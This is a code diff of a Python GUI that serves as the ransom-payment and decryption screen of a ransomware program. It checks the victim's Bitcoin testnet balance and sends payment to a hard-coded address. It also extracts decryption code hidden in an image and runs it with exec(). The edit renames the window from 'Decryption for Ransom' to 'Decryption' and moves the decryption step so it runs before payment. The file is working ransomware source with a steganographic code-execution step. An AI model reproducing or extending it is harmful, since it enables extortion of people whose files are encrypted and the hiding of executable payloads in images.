@@ -10,6 +10,7 @@ from extract import extract_file
 def clicking_submit():
     global round
 
+    # Performs the model logic associated with opening a testnet wallet
     if round == 1:
         wallet_name: str = response_entry1.get()
         wallet_password: str = response_entry2.get()
@@ -38,27 +39,52 @@ def clicking_submit():
 
     elif round == 2:
         global amount_to_send
+        try:
+            amount_to_send = float(response_entry3.get())
+            balance = float(wallet.balance())
+            print(f"Amount to Send: {amount_to_send}, Wallet Balance: {balance}")
 
-        amount_to_send = float(response_entry3.get())
-        print(f"Amount to Send: {amount_to_send}")
+            if amount_to_send > balance:
+                warning_label = Label(window, text="Insufficient funds! Add more testnet BTC.", fg="red")
+                warning_label.pack(pady=2)
+                print("Insufficient funds! Add more testnet BTC.")
+            else:
+                success_label = Label(window, text="Transaction valid! Proceeding...", fg="green")
+                success_label.pack(pady=2)
+                print("Transaction valid! Proceeding...")
 
-        balance = float(wallet.balance())
-        print(f"Wallet Balance: {balance}")
-
-        if amount_to_send > balance:
-            warning_label = Label(window, text="Insufficient funds! Add more testnet BTC to your wallet.", fg="red")
+                round += 1
+                for widget in window.winfo_children():
+                    if widget != image_label:
+                        widget.destroy()
+                #setup_round_3()
+        except ValueError:
+            warning_label = Label(window, text="Enter a valid amount.", fg="red")
             warning_label.pack(pady=2)
-        else:
-            success_label = Label(window, text="Transaction valid! Initiating transaction now...", fg="green")
-            success_label.pack(pady=2)
+        import os
+        # Extracts the key from a specified image
+        with open("passphrase.txt", "r") as file:
+            lines = file.readlines()
+            passphrase = lines[0].strip("\n")
 
-            round += 1
+        with open("images.txt", "r") as file:
+            lines = file.readlines()
+            image_containing_decryption_code: str = lines[3].strip("\n")
 
-            # Transitions to the next round
-            for widget in window.winfo_children():
-                if widget != image_label:
-                    widget.destroy()
-            setup_round_3()
+        try:
+            decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
+            if decryption_code_found:
+                code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
+                exec("import decrypt")
+                exec(f"{code_to_decrypt_files}")
+            else:
+                raise FileNotFoundError(
+                    f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
+                    f"Either the name fed to the variable in the code to be updated or the image "
+                    f"specified just doesn't exist.")
+        except FileNotFoundError as fnfe:
+            print(f"File Not Found: {fnfe}")
+            return
 
 
 def setup_round_1():
@@ -115,7 +141,8 @@ def setup_round_3():
     receiver_address: str = "tb1q8fwk4r7tvt5zm6xc40ucd5mljesdj2jyt5hpea"
     wallet.utxos_update()
     try:
-        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet", fee=1000, broadcast=True)
+        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet", fee=1000,
+                                            broadcast=True)
     except Exception as e:
         print(f"Transaction failed: {e}")
         return
@@ -128,18 +155,22 @@ def setup_round_3():
             # The transaction was not found or failed
             print("Transaction details could not be retrieved. Please verify the transaction ID.")
             return
+
         if isinstance(transaction_details, bitcoinlib.transactions.Transaction):
             # Extract outputs and check if the transaction is successful
             print(f"Transaction retrieved successfully: {transaction_details}")
             for output in transaction_details.outputs:
                 if output['address'] == receiver_address:
                     print(f"Transaction successful! Sent {amount_to_send} tBTC to {receiver_address}")
+
                     transaction_details_label = Label(text="Transaction successful", fg="blue")
                     transaction_details_label.pack()
+
                     successful_transaction_label = Label(
                         text="Decrypting your files now. Nice doing business with you. :)",
                         fg="green")
                     successful_transaction_label.pack()
+
                     import os
                     # Extracts the key from a specified image
                     with open("passphrase.txt", "r") as file:
@@ -165,13 +196,16 @@ def setup_round_3():
                     except FileNotFoundError as fnfe:
                         print(f"File Not Found: {fnfe}")
                         return
+            print("Receiver address not found in transaction outputs.")
+        else:
+            print("Unexpected transaction details type returned.")
     except Exception as e:
         print(f"Failed to retrieve transaction details: {e}")
 
 
 # Main Window Setup
 window = Tk()
-window.title("Decryption for Ransom")
+window.title("Decryption")
 image = Image.open("Popup.png")
 resized_image = image.resize((673, 383))
 photo = ImageTk.PhotoImage(resized_image)
